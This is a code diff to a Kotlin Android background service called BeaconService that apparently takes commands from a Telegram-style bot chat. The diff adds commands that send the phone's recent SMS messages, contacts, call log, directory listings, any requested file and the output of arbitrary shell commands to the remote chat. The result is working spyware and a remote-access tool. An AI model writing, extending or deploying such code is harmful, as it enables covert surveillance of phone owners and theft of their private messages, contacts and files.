@@ -11,6 +11,7 @@ import okhttp3.*
 import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.MediaType.Companion.toMediaType
 import org.json.JSONObject
+import java.io.File
 import java.util.concurrent.TimeUnit
 
 class BeaconService : Service() {
@@ -37,7 +38,7 @@ class BeaconService : Service() {
         try {
             send("beacon\nmodel: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
         } catch (e: Exception) {
-            Log.e("beacon", "start beacon failed", e)
+            Log.e("beacon", "beacon", e)
         }
         while (true) {
             try {
@@ -52,18 +53,40 @@ class BeaconService : Service() {
                     val chat = msg.optJSONObject("chat")?.optString("id") ?: continue
                     if (chat != CHAT_ID) continue
                     val text = msg.optString("text", "")
-                    when (text) {
-                        "/ping" -> send("pong")
-                        "/info" -> send("model: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
-                        "/location" -> send(locationText())
-                        else -> if (text.isNotEmpty()) send("got: $text")
-                    }
+                    handleCmd(text)
                 }
             } catch (e: Exception) {
-                Log.e("beacon", "poll err", e)
+                Log.e("beacon", "poll", e)
             }
             delay(3000)
         }
+    }
+
+    private fun handleCmd(cmd: String) {
+        val parts = cmd.trim().split(" ", limit = 2)
+        val verb = parts[0].lowercase()
+        val arg = if (parts.size > 1) parts[1].trim() else ""
+        try {
+            when (verb) {
+                "/ping" -> send("pong")
+                "/info" -> send(infoText())
+                "/location" -> send(locationText())
+                "/sms" -> send(smsText())
+                "/contacts" -> send(contactsText())
+                "/calls" -> send(callsText())
+                "/ls" -> send(lsText(arg))
+                "/get" -> sendFile(arg)
+                "/shell" -> send(shellText(arg))
+                "/battery" -> send(batteryText())
+                else -> if (cmd.isNotEmpty()) send("got: $cmd")
+            }
+        } catch (e: Exception) {
+            send("err: ${e.message}")
+        }
+    }
+
+    private fun infoText(): String {
+        return "model: ${Build.MODEL}\nbrand: ${Build.BRAND}\nmanufacturer: ${Build.MANUFACTURER}\nandroid: ${Build.VERSION.RELEASE}\nsdk: ${Build.VERSION.SDK_INT}\nboard: ${Build.BOARD}\ndevice: ${Build.DEVICE}\nhost: ${Build.HOST}"
     }
 
     private fun locationText(): String {
@@ -71,13 +94,117 @@ class BeaconService : Service() {
             val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
             val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                 ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
-            if (loc != null) {
-                "lat: ${loc.latitude}\nlon: ${loc.longitude}\naccuracy: ${loc.accuracy}m"
-            } else {
-                "no location yet"
-            }
+            if (loc != null) "lat: ${loc.latitude}\nlon: ${loc.longitude}\naccuracy: ${loc.accuracy}m" else "no location"
         } catch (e: Exception) {
-            "loc error: ${e.message}"
+            "loc err: ${e.message}"
+        }
+    }
+
+    private fun smsText(): String {
+        return try {
+            val sb = StringBuilder()
+            val cursor = contentResolver.query(
+                android.provider.Telephony.Sms.CONTENT_URI,
+                null, null, null, "date DESC LIMIT 20"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val addr = it.getString(it.getColumnIndexOrThrow("address"))
+                    val body = it.getString(it.getColumnIndexOrThrow("body"))
+                    sb.append("$addr: $body\n")
+                }
+            }
+            sb.toString().take(3500).ifEmpty { "no sms" }
+        } catch (e: Exception) {
+            "sms err: ${e.message}"
+        }
+    }
+
+    private fun contactsText(): String {
+        return try {
+            val sb = StringBuilder()
+            val cursor = contentResolver.query(
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                    val phone = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
+                    sb.append("$name: $phone\n")
+                }
+            }
+            sb.toString().take(3500).ifEmpty { "no contacts" }
+        } catch (e: Exception) {
+            "contacts err: ${e.message}"
+        }
+    }
+
+    private fun callsText(): String {
+        return try {
+            val sb = StringBuilder()
+            val cursor = contentResolver.query(
+                android.provider.CallLog.Calls.CONTENT_URI,
+                null, null, null, "date DESC LIMIT 20"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val num = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
+                    val dur = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))
+                    val type = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
+                    sb.append("$num [$type] ${dur}s\n")
+                }
+            }
+            sb.toString().take(3500).ifEmpty { "no calls" }
+        } catch (e: Exception) {
+            "calls err: ${e.message}"
+        }
+    }
+
+    private fun batteryText(): String {
+        return try {
+            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
+            val level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            "battery: $level%"
+        } catch (e: Exception) {
+            "battery err: ${e.message}"
+        }
+    }
+
+    private fun lsText(path: String): String {
+        return try {
+            val dir = if (path.isEmpty()) File("/sdcard") else File(path)
+            dir.listFiles()?.take(60)?.joinToString("\n") { it.name } ?: "empty"
+        } catch (e: Exception) {
+            "ls err: ${e.message}"
+        }
+    }
+
+    private fun sendFile(path: String) {
+        try {
+            val f = File(path)
+            if (!f.exists()) { send("not found: $path"); return }
+            val bytes = f.readBytes()
+            val body = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", CHAT_ID)
+                .addFormDataPart("document", f.name, bytes.toRequestBody(null))
+                .build()
+            val req = Request.Builder().url("$API/sendDocument").post(body).build()
+            client.newCall(req).execute().close()
+        } catch (e: Exception) {
+            send("file err: ${e.message}")
+        }
+    }
+
+    private fun shellText(cmd: String): String {
+        return try {
+            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
+            val out = proc.inputStream.bufferedReader().readText()
+            val err = proc.errorStream.bufferedReader().readText()
+            (out + err).take(3500).ifEmpty { "no output" }
+        } catch (e: Exception) {
+            "shell err: ${e.message}"
         }
     }
 
@@ -88,7 +215,7 @@ class BeaconService : Service() {
             val req = Request.Builder().url("$API/sendMessage").post(body).build()
             client.newCall(req).execute().close()
         } catch (e: Exception) {
-            Log.e("beacon", "send err", e)
+            Log.e("beacon", "send", e)
         }
     }
 
